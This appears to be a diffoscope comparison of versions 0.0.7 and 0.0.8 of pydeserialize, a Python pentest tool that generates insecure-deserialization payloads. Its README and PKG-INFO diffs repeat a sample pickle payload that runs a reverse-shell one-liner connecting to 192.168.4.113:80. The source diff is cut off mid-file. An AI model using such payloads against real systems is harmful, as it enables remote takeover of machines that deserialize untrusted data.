# Comparing `tmp/pydeserialize-0.0.7.tar.gz` & `tmp/pydeserialize-0.0.8.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pydeserialize-0.0.7.tar", last modified: Sun Mar 12 23:15:42 2023, max compression
+gzip compressed data, was "pydeserialize-0.0.8.tar", last modified: Fri May 26 16:00:46 2023, max compression
```

## Comparing `pydeserialize-0.0.7.tar` & `pydeserialize-0.0.8.tar`

### file list

```diff
@@ -1,21 +1,21 @@
-drwxrwxrwx   0        0        0        0 2023-03-12 23:15:42.211352 pydeserialize-0.0.7/
--rw-rw-rw-   0        0        0     1097 2023-03-12 03:17:19.000000 pydeserialize-0.0.7/LICENSE
--rw-rw-rw-   0        0        0     4310 2023-03-12 23:15:42.210344 pydeserialize-0.0.7/PKG-INFO
--rw-rw-rw-   0        0        0     2960 2023-03-12 23:15:17.000000 pydeserialize-0.0.7/README.md
-drwxrwxrwx   0        0        0        0 2023-03-12 23:15:42.200523 pydeserialize-0.0.7/pydeserialize/
--rw-rw-rw-   0        0        0       42 2023-03-12 04:53:32.000000 pydeserialize-0.0.7/pydeserialize/__init__.py
--rw-rw-rw-   0        0        0       89 2023-03-12 13:33:46.000000 pydeserialize-0.0.7/pydeserialize/__main__.py
--rw-rw-rw-   0        0        0      340 2023-03-12 23:14:53.000000 pydeserialize-0.0.7/pydeserialize/__meta__.py
--rw-rw-rw-   0        0        0      439 2023-03-12 03:22:07.000000 pydeserialize-0.0.7/pydeserialize/encoded.py
--rw-rw-rw-   0        0        0     1434 2023-03-12 23:15:04.000000 pydeserialize-0.0.7/pydeserialize/pydeserialize.py
--rw-rw-rw-   0        0        0     1575 2023-03-12 04:45:09.000000 pydeserialize-0.0.7/pydeserialize/run.py
-drwxrwxrwx   0        0        0        0 2023-03-12 23:15:42.207992 pydeserialize-0.0.7/pydeserialize.egg-info/
--rw-rw-rw-   0        0        0     4310 2023-03-12 23:15:42.000000 pydeserialize-0.0.7/pydeserialize.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      441 2023-03-12 23:15:42.000000 pydeserialize-0.0.7/pydeserialize.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-03-12 23:15:42.000000 pydeserialize-0.0.7/pydeserialize.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       73 2023-03-12 23:15:42.000000 pydeserialize-0.0.7/pydeserialize.egg-info/entry_points.txt
--rw-rw-rw-   0        0        0        2 2023-03-12 23:15:42.000000 pydeserialize-0.0.7/pydeserialize.egg-info/not-zip-safe
--rw-rw-rw-   0        0        0       10 2023-03-12 23:15:42.000000 pydeserialize-0.0.7/pydeserialize.egg-info/requires.txt
--rw-rw-rw-   0        0        0       14 2023-03-12 23:15:42.000000 pydeserialize-0.0.7/pydeserialize.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-03-12 23:15:42.211352 pydeserialize-0.0.7/setup.cfg
--rw-rw-rw-   0        0        0     2232 2023-03-12 22:24:24.000000 pydeserialize-0.0.7/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 16:00:46.322910 pydeserialize-0.0.8/
+-rw-r--r--   0 runner    (1001) docker     (123)     1078 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)     4195 2023-05-26 16:00:46.318910 pydeserialize-0.0.8/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)     2878 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 16:00:46.318910 pydeserialize-0.0.8/pydeserialize/
+-rw-r--r--   0 runner    (1001) docker     (123)       41 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       86 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      335 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/__meta__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      419 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/encoded.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1655 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/pydeserialize.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1449 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/pydeserialize/run.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 16:00:46.318910 pydeserialize-0.0.8/pydeserialize.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     4195 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      441 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       73 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/entry_points.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/not-zip-safe
+-rw-r--r--   0 runner    (1001) docker     (123)       10 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       14 2023-05-26 16:00:46.000000 pydeserialize-0.0.8/pydeserialize.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-26 16:00:46.322910 pydeserialize-0.0.8/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     2171 2023-05-26 16:00:33.000000 pydeserialize-0.0.8/setup.py
```

### Comparing `pydeserialize-0.0.7/LICENSE` & `pydeserialize-0.0.8/LICENSE`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,20 +1,20 @@
-The MIT License (MIT)
-
-Copyright (c) 2023 João Victor
-
-Permission is hereby granted, free of charge, to any person obtaining a copy of
-this software and associated documentation files (the "Software"), to deal in
-the Software without restriction, including without limitation the rights to
-use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
-the Software, and to permit persons to whom the Software is furnished to do so,
-subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
-FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
-COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
-IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
+The MIT License (MIT)
+
+Copyright (c) 2023 João Victor
+
+Permission is hereby granted, free of charge, to any person obtaining a copy of
+this software and associated documentation files (the "Software"), to deal in
+the Software without restriction, including without limitation the rights to
+use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
+the Software, and to permit persons to whom the Software is furnished to do so,
+subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
+FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
+COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
+IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
```

### Comparing `pydeserialize-0.0.7/PKG-INFO` & `pydeserialize-0.0.8/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,106 +1,106 @@
-Metadata-Version: 2.1
-Name: pydeserialize
-Version: 0.0.7
-Summary: Insecure deserialization in python
-Home-page: https://github.com/joaoviictorti/pyserialize
-Author: joaoviictorti (viictorjj)
-Author-email: joaovictorti08@gmail.com
-License: MIT License
-Keywords: serialize insegura desserialize
-Classifier: Development Status :: 5 - Production/Stable
-Classifier: Environment :: Console
-Classifier: Intended Audience :: System Administrators
-Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
-Classifier: Natural Language :: English
-Classifier: Operating System :: OS Independent
-Classifier: Programming Language :: Python
-Classifier: Programming Language :: Python :: 3
-Classifier: Programming Language :: Python :: 3.8
-Classifier: Programming Language :: Python :: 3.9
-Classifier: Programming Language :: Python :: 3.10
-Classifier: Programming Language :: Python :: 3.11
-Classifier: Programming Language :: Python :: 3 :: Only
-Classifier: Programming Language :: Python :: Implementation :: PyPy
-Classifier: Topic :: Security
-Classifier: Topic :: System :: Networking
-Classifier: Topic :: System :: Operating System
-Classifier: Topic :: System :: Systems Administration
-Classifier: Topic :: Utilities
-Requires-Python: >=3.6, <4
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
-
-[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)](https://git.io/typing-svg)
-
-
-
-<h4 align="center">Tool for testing python insecure deserialization vulnerabilities</h4>
-
-
-<p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-pydeserialize">Usage</a>
-</p>
-
----
-
-
-O pydeserialize é uma ferramenta que gera payloads de desserialização insegura em python. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. pydeserialize é construído para fazer apenas uma coisa - gera payloads de desserialização insegura + encodes e faz isso muito bem.
-
-Projetei o `pydeserialize` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
-
-# Características
-
- - Gera payloads para explora vulnerabilidades de desserialização insegura em python    
-
-# Forma de utilização
-
-```sh
-pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
-pydeserialize -ip 192.168.4.113 -e b64-p 80 -o Linux
-```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
-```yaml
-           _                 _     _ _         
- ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
-| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
-|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
-|_| |___|  
-     v0.0.7 - @joaoviictorti     
-
-options:
-  -h, --help            show this help message and exit
-  -ip IP                Insert ip
-  -p PORT               Insert port
-  -e {b64,shell,urlencode,hex} Insert encoding
-  -o {Windows,Linux}    Insert operational system
-```
-
-# Instalação
-
-pydeserialize requer **python3** e para baixá-lo só usar:
-
-```sh
-pip3 install pydeserialize
-```
-
-# Executando pydeserialize
-
-```console
-pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell
-
-           _                 _     _ _         
- ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
-| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
-|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
-|_| |___|  
-     v0.0.7 - @joaoviictorti     
-
-b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
-```
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
+Metadata-Version: 2.1
+Name: pydeserialize
+Version: 0.0.8
+Summary: Insecure deserialization in python
+Home-page: https://github.com/joaoviictorti/pyserialize
+Author: joaoviictorti (viictorjj)
+Author-email: joaovictorti08@gmail.com
+License: MIT License
+Keywords: serialize insegura desserialize
+Classifier: Development Status :: 5 - Production/Stable
+Classifier: Environment :: Console
+Classifier: Intended Audience :: System Administrators
+Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
+Classifier: Natural Language :: English
+Classifier: Operating System :: OS Independent
+Classifier: Programming Language :: Python
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Programming Language :: Python :: 3 :: Only
+Classifier: Programming Language :: Python :: Implementation :: PyPy
+Classifier: Topic :: Security
+Classifier: Topic :: System :: Networking
+Classifier: Topic :: System :: Operating System
+Classifier: Topic :: System :: Systems Administration
+Classifier: Topic :: Utilities
+Requires-Python: >=3.6, <4
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
+
+[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)](https://git.io/typing-svg)
+
+
+
+<h4 align="center">Tool for testing python insecure deserialization vulnerabilities</h4>
+
+
+<p align="center">
+  <a href="#características">Features</a> •
+  <a href="#instalação">Install</a> •
+  <a href="#forma-de-utilização">How to use</a> •
+  <a href="#executando-pydeserialize">Usage</a>
+</p>
+
+---
+
+
+O pydeserialize é uma ferramenta que gera payloads de desserialização insegura em python. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. pydeserialize é construído para fazer apenas uma coisa - gera payloads de desserialização insegura + encodes e faz isso muito bem.
+
+Projetei o `pydeserialize` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
+
+# Características
+
+ - Gera payloads para explora vulnerabilidades de desserialização insegura em python    
+
+# Forma de utilização
+
+```sh
+pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
+pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux
+```
+Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
+```yaml
+           _                 _     _ _         
+ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
+| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
+|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
+|_| |___|  
+     v0.0.8 - @joaoviictorti
+
+options:
+  -h, --help            show this help message and exit
+  -ip IP                Insert ip
+  -p PORT               Insert port
+  -e {b64,shell,urlencode,hex} Insert encoding
+  -o {Windows,Linux}    Insert operational system
+```
+
+# Instalação
+
+pydeserialize requer **python3** e para baixá-lo só usar:
+
+```sh
+pip3 install pydeserialize
+```
+
+# Executando pydeserialize
+
+```console
+pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell
+
+           _                 _     _ _         
+ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
+| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
+|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
+|_| |___|  
+     v0.0.8 - @joaoviictorti
+
+b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
+```
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: pydeserialize Version: 0.0.7 Summary: Insecure
+Metadata-Version: 2.1 Name: pydeserialize Version: 0.0.8 Summary: Insecure
 deserialization in python Home-page: https://github.com/joaoviictorti/
 pyserialize Author: joaoviictorti (viictorjj) Author-email:
 joaovictorti08@gmail.com License: MIT License Keywords: serialize insegura
 desserialize Classifier: Development Status :: 5 - Production/Stable
 Classifier: Environment :: Console Classifier: Intended Audience :: System
 Administrators Classifier: License :: OSI Approved :: GNU General Public
 License v3 (GPLv3) Classifier: Natural Language :: English Classifier:
@@ -29,25 +29,25 @@
 pydeserialize Ã© construÃ­do para fazer apenas uma coisa - gera payloads de
 desserializaÃ§Ã£o insegura + encodes e faz isso muito bem. Projetei o
 `pydeserialize` para cumprir todas as responsabilidades para gera payloads e
 encodes, mantive um modelo consistentemente passivo para tornÃ¡-lo Ãºtil para
 testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera payloads para explora
 vulnerabilidades de desserializaÃ§Ã£o insegura em python # Forma de
 utilizaÃ§Ã£o ```sh pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
-pydeserialize -ip 192.168.4.113 -e b64-p 80 -o Linux ``` Isso exibirÃ¡ a ajuda
+pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux ``` Isso exibirÃ¡ a ajuda
 para a ferramenta. Aqui estÃ£o todos os switches que ele suporta: ```yaml _ _ _
 _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . | | | . | -_|_ -| -_| _| |
-.'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___| v0.0.7
+.'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___| v0.0.8
 - @joaoviictorti options: -h, --help show this help message and exit -ip IP
 Insert ip -p PORT Insert port -e {b64,shell,urlencode,hex} Insert encoding -o
 {Windows,Linux} Insert operational system ``` # InstalaÃ§Ã£o pydeserialize
 requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install pydeserialize
 ``` # Executando pydeserialize ```console pydeserialize -ip 192.168.4.113 -p 80
 -o Windows -e shell _ _ _ _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . |
 | | . | -_|_ -| -_| _| | .'| | |- _| -_| | _|_ |___|___|___|___|_|
-|_|__,|_|_|___|___| |_| |___| v0.0.7 - @joaoviictorti
+|_|__,|_|_|___|___| |_| |___| v0.0.8 - @joaoviictorti
 b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python
 -c \'import socket,subprocess,os;s=socket.socket
 (socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2
 (s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;
 pty.spawn("powershell")\'\x94\x85\x94R\x94.' ``` [https://capsule-
 render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `pydeserialize-0.0.7/README.md` & `pydeserialize-0.0.8/README.md`

 * *Files 16% similar despite different names*

```diff
@@ -1,74 +1,74 @@
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
-
-[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)](https://git.io/typing-svg)
-
-
-
-<h4 align="center">Tool for testing python insecure deserialization vulnerabilities</h4>
-
-
-<p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-pydeserialize">Usage</a>
-</p>
-
----
-
-
-O pydeserialize é uma ferramenta que gera payloads de desserialização insegura em python. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. pydeserialize é construído para fazer apenas uma coisa - gera payloads de desserialização insegura + encodes e faz isso muito bem.
-
-Projetei o `pydeserialize` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
-
-# Características
-
- - Gera payloads para explora vulnerabilidades de desserialização insegura em python    
-
-# Forma de utilização
-
-```sh
-pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
-pydeserialize -ip 192.168.4.113 -e b64-p 80 -o Linux
-```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
-```yaml
-           _                 _     _ _         
- ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
-| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
-|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
-|_| |___|  
-     v0.0.7 - @joaoviictorti     
-
-options:
-  -h, --help            show this help message and exit
-  -ip IP                Insert ip
-  -p PORT               Insert port
-  -e {b64,shell,urlencode,hex} Insert encoding
-  -o {Windows,Linux}    Insert operational system
-```
-
-# Instalação
-
-pydeserialize requer **python3** e para baixá-lo só usar:
-
-```sh
-pip3 install pydeserialize
-```
-
-# Executando pydeserialize
-
-```console
-pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell
-
-           _                 _     _ _         
- ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
-| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
-|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
-|_| |___|  
-     v0.0.7 - @joaoviictorti     
-
-b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
-```
-
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
+
+[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)](https://git.io/typing-svg)
+
+
+
+<h4 align="center">Tool for testing python insecure deserialization vulnerabilities</h4>
+
+
+<p align="center">
+  <a href="#características">Features</a> •
+  <a href="#instalação">Install</a> •
+  <a href="#forma-de-utilização">How to use</a> •
+  <a href="#executando-pydeserialize">Usage</a>
+</p>
+
+---
+
+
+O pydeserialize é uma ferramenta que gera payloads de desserialização insegura em python. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. pydeserialize é construído para fazer apenas uma coisa - gera payloads de desserialização insegura + encodes e faz isso muito bem.
+
+Projetei o `pydeserialize` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
+
+# Características
+
+ - Gera payloads para explora vulnerabilidades de desserialização insegura em python    
+
+# Forma de utilização
+
+```sh
+pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
+pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux
+```
+Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
+```yaml
+           _                 _     _ _         
+ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
+| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
+|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
+|_| |___|  
+     v0.0.8 - @joaoviictorti
+
+options:
+  -h, --help            show this help message and exit
+  -ip IP                Insert ip
+  -p PORT               Insert port
+  -e {b64,shell,urlencode,hex} Insert encoding
+  -o {Windows,Linux}    Insert operational system
+```
+
+# Instalação
+
+pydeserialize requer **python3** e para baixá-lo só usar:
+
+```sh
+pip3 install pydeserialize
+```
+
+# Executando pydeserialize
+
+```console
+pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell
+
+           _                 _     _ _         
+ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
+| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
+|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
+|_| |___|  
+     v0.0.8 - @joaoviictorti
+
+b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
+```
+
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -11,25 +11,25 @@
 pydeserialize Ã© construÃ­do para fazer apenas uma coisa - gera payloads de
 desserializaÃ§Ã£o insegura + encodes e faz isso muito bem. Projetei o
 `pydeserialize` para cumprir todas as responsabilidades para gera payloads e
 encodes, mantive um modelo consistentemente passivo para tornÃ¡-lo Ãºtil para
 testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera payloads para explora
 vulnerabilidades de desserializaÃ§Ã£o insegura em python # Forma de
 utilizaÃ§Ã£o ```sh pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
-pydeserialize -ip 192.168.4.113 -e b64-p 80 -o Linux ``` Isso exibirÃ¡ a ajuda
+pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux ``` Isso exibirÃ¡ a ajuda
 para a ferramenta. Aqui estÃ£o todos os switches que ele suporta: ```yaml _ _ _
 _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . | | | . | -_|_ -| -_| _| |
-.'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___| v0.0.7
+.'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___| v0.0.8
 - @joaoviictorti options: -h, --help show this help message and exit -ip IP
 Insert ip -p PORT Insert port -e {b64,shell,urlencode,hex} Insert encoding -o
 {Windows,Linux} Insert operational system ``` # InstalaÃ§Ã£o pydeserialize
 requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install pydeserialize
 ``` # Executando pydeserialize ```console pydeserialize -ip 192.168.4.113 -p 80
 -o Windows -e shell _ _ _ _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . |
 | | . | -_|_ -| -_| _| | .'| | |- _| -_| | _|_ |___|___|___|___|_|
-|_|__,|_|_|___|___| |_| |___| v0.0.7 - @joaoviictorti
+|_|__,|_|_|___|___| |_| |___| v0.0.8 - @joaoviictorti
 b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python
 -c \'import socket,subprocess,os;s=socket.socket
 (socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2
 (s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;
 pty.spawn("powershell")\'\x94\x85\x94R\x94.' ``` [https://capsule-
 render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `pydeserialize-0.0.7/pydeserialize/pydeserialize.py` & `pydeserialize-0.0.8/pydeserialize/pydeserialize.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,25 +1,25 @@
-import argparse
-from .run import ObjetoMalicioso
-from argparse import RawTextHelpFormatter
-
-def banner():
-    return """                                                                                                                                            
-           _                 _     _ _         
- ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
-| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
-|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
-|_| |___|  
-     v0.0.7 - @joaoviictorti                                                
-"""
-
-def argumentos() -> None:
-    
-    parse = argparse.ArgumentParser(prog=banner(),usage="pydeserialize -ip 192.168.4.113 -p 80 -o Windows",formatter_class=RawTextHelpFormatter)
-    parse.add_argument("--version",action="version",version="pydeserialize 0.0.7")
-    parse.add_argument("-ip",action="store",type=str,dest="ip",required=True, help="Insert ip")
-    parse.add_argument("-p",action="store",type=str,dest="port",required=True, help="Insert port")
-    parse.add_argument("-e",action="store",type=str,dest="encode",choices=["b64","shell","urlencode","hex"],default="",required=True,help="Insert encoding")
-    parse.add_argument("-o",action="store",type=str,dest="SO",choices=["Windows","Linux"],required=True,help="Insert operational system")
-    args = parse.parse_args()
-    
+import argparse
+from .run import ObjetoMalicioso
+from argparse import RawTextHelpFormatter
+
+def banner():
+    return """                                                                                                                                                                                                                    
+           _                 _     _ _         
+ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
+| . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
+|  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
+|_| |___|                                                                                                                                                                            
+     v0.0.8 - @joaoviictorti                                                   
+"""
+
+def argumentos() -> None:
+    
+    parse = argparse.ArgumentParser(prog=banner(),usage="pydeserialize -ip 192.168.4.113 -p 80 -o Windows",formatter_class=RawTextHelpFormatter)
+    parse.add_argument("--version",action="version",version="pydeserialize 0.0.7")
